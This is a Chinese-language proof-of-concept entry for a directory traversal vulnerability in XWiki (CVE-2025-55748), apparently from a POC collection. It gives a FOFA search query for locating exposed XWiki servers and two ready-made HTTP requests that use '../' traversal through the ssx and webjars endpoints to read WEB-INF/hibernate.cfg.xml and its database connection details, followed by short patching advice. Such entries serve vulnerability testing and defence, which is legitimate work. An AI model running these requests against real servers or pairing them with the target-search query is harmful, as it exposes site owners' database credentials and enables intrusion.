## XWiki 目录遍历漏洞（CVE-2025-55748）

## 漏洞描述
XWiki 的静态资源端点 `ssx` / `jsx` 及 WebJars 资源加载接口未正确校验 `resource` 参数，攻击者可通过 `../` 穿越读取 `WEB-INF/hibernate.cfg.xml` 等敏感文件，从而获取数据库连接信息。

## 资产测绘
```
fofa: body="data-xwiki-reference"
```

## POC 1
```
GET /bin/ssx/Main/WebHome?resource=../../../../WEB-INF/hibernate.cfg.xml&minify=false HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

## POC 2
```
GET /xwiki/webjars/wiki/XWiki/../../../../WEB-INF/hibernate.cfg.xml HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: JSESSIONID=E098C8B0D4FE2E46CF8D517FAC6268F
Connection: keep-alive
```
若响应直接返回 Hibernate 配置内容，则漏洞成立。

## 修复建议
- 升级至官方修复的版本
- 在反向代理层禁止 `../` 等路径穿越字符
- 对静态资源接口增加白名单

